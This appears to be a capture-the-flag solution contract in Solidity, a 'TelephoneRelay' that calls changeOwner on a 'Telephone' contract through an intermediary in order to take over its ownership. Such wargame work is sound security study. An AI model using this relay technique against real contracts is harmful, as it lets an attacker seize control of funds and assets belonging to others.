import "./Telephone.sol";

pragma solidity ^0.5.0;

contract TelephoneRelay {

    function changeOwner(address target) public {
        Telephone(target).changeOwner(msg.sender);
    }
}